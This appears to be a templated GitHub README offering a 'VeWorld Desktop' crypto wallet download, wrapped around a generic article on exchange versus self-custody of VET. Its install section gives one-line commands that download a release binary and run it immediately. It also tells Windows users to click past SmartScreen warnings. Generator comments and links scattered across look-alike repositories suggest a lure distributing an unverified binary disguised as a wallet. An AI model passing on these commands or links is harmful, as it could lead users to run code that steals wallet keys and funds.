![VeWorld Desktop](../assets/banner-article.png)

# VeChain Hardware Wallet or Exchange: Custody in VeWorld Desktop

Who can move the balance without asking you

## Downloads - v2.2.4

<p align="center"><a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`VeWorld-desktop-wallet-win-v2.2.4.exe`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`VeWorld-desktop-wallet-macos-v2.2.4.dmg`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`VeWorld-desktop-wallet-linux-v2.2.4.zip`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip) |

Download the [current VeWorld Desktop release](https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4) for Windows, macOS and Linux.

> VeWorld Desktop is actively maintained; run the current release before treating a display problem as a wallet fault.

An exchange account holds your VET for you; a hardware wallet and VeWorld Desktop hold the keys that control an address you own. The difference is who can move the balance without your involvement, and it decides what happens if the platform freezes withdrawals, is breached, or closes.

<!-- ARTICLE-BODY-BEGIN -->

## You'll see this if

You are deciding whether to leave a balance on an exchange or move it to a wallet, or you have both and are unsure which one actually owns the asset.

| Arrangement | Who can move the funds | What you hold | What can go wrong |
|---|---|---|---|
| Exchange balance | The platform, on your instruction | A claim on their ledger | Freezes, breaches, insolvency |
| Software wallet | You, with a password and phrase | Keys on your machine | Malware, lost phrase, phishing |
| Hardware wallet | You, with the device | Keys on the device | Lost device, exposed phrase |
| Exchange plus wallet | Split by decision | Both, with different risks | Custody confusion, wrong network sends |

## Why it happens

Custody is a legal and technical arrangement, not a preference. When a platform holds an asset, the balance in your account is a record of what it owes you, and the actual tokens sit in addresses the platform controls. That is convenient and it is also a dependency: withdrawals can pause, and recovery after a failure is a claims process rather than a transaction.

Self-custody reverses the dependency. The tokens sit at an address whose keys you hold, so nobody can pause your access, and nobody can restore it either. The trade is that mistakes are final and the phrase is the only backup, which is a real cost rather than a slogan.

The two arrangements fail differently, which is the useful comparison. A platform failure is someone else's decision arriving without warning; a self-custody failure is usually a decision you made, whether approving something you did not read or storing a phrase badly. Neither is automatically safer; what differs is who you have to trust, and how quickly a problem becomes yours to solve.

Most people end up with both, and the risk then becomes operational: sending to the wrong network, or believing a balance is protected when it has been left on a platform for convenience. Deciding deliberately which portion belongs where, and moving it accordingly, removes that ambiguity.

## Fix

1. Decide the split by purpose: a working balance where you transact, and a held balance in self-custody.
2. For self-custody, install the current release of VeWorld Desktop from the project's GitHub releases page.
3. Create the wallet and write <a href="https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/forgot-vechain-wallet-password-in-veworld-desktop.md">your VeWorld Desktop recovery phrase</a> on paper before any transfer.
4. Pair a Ledger if the amount justifies hardware, and confirm the address on the device screen.
5. Send a small test transfer first, confirm it arrives, then move the intended amount.
6. Record which addresses are yours and which are platform deposit addresses, so a later transfer cannot confuse them.

## If that did not work

If a withdrawal is paused, nothing on the wallet side can release it. Custody means the platform controls the sending side, and the resolution is their process rather than a transaction.

If a transfer to a platform deposit address does not appear in your account there, confirm the network first. A transfer sent on a different chain reaches an address the platform does not credit on this one.

If a self-custody balance is missing, work through account selection and network selection before assuming loss, since a wrong account looks identical to an empty wallet.

## Prevention

- Keep only a working balance on a platform, and move the rest to keys you control.
- Test with a small amount before any large transfer in either direction.
- Verify the destination network for every transfer, because 0x addresses look alike across chains.
- Never enter the recovery phrase into a platform, a website or a chat; no legitimate service needs it.

VeWorld Desktop is actively maintained, and the current release can be downloaded from the <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4">VeWorld Desktop releases page</a>.

## FAQ

### Is an exchange balance still <a href="https://github.com/veworldwallet/veworld-desktop-fees/blob/main/how-to/what-is-vet-in-veworld-desktop.md">my VET</a>?

It is a claim on the platform rather than a token at an address you control. The tokens exist, but the keys that move them belong to the platform.

### Is self-custody automatically safer?

No. It removes platform risk and adds personal risk: phrase handling, approvals and address accuracy all become yours to get right.

### How much should stay on an exchange?

Only what you need for trading or spending there. Anything held for the long term is exposed to a decision you do not make.

### Can a hardware wallet protect funds left on an exchange?

No. A device protects keys you hold. A platform balance has no key of yours to protect.

### What is the biggest self-custody mistake?

Sending to the wrong address or network, and storing the recovery phrase somewhere it can be read. Both are habits rather than technical failures.

### Does the wallet work with exchange withdrawals?

Yes, for withdrawals to a VeChainThor address. The network selection on the sending side is what decides whether it arrives.

### What happens if a platform suspends withdrawals?

Nothing on the wallet side can release them, because the platform controls the sending addresses. The resolution is their process, which is the concrete cost of custodial convenience.

### Can I keep a balance in both places?

Yes, and most people do. What matters is deciding which portion is working capital and which is held, then keeping the two clearly separated in your own records.

### Is a hardware wallet necessary for self-custody?

No. A software wallet holds keys locally and signs from the machine; hardware adds a physical confirmation step, which is worth it for balances you would not want to lose.

<!-- ARTICLE-BODY-END -->

## How to install VeWorld Desktop

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe">VeWorld-desktop-wallet-win-v2.2.4.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg">VeWorld-desktop-wallet-macos-v2.2.4.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
<!-- BLOCKED: the Linux release asset is a .zip with no verified extraction or launch facts,
     so no command is generated. The verified manual steps are kept below. -->
Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-linux-v2.2.4.zip">VeWorld-desktop-wallet-linux-v2.2.4.zip</a>.
2. Unzip the archive.
3. Run the application inside it.
<!-- INSTALL-END -->

## Related guides

- [How self-custody protects a balance](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/is-veworld-wallet-safe-in-veworld-desktop.md)
- [Getting a Ledger signing properly](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/pair-a-vechain-ledger-with-veworld-desktop.md)
- [What can go wrong even with hardware](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-ledger-wallet-losses-veworld-desktop.md)
- [Reading a zero balance correctly](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/check-vechain-balance-zero-in-veworld-desktop.md)
- [What VeWorld Desktop is](https://github.com/veworldwallet/veworld-desktop-fees/blob/main/how-to/what-is-veworld-desktop.md)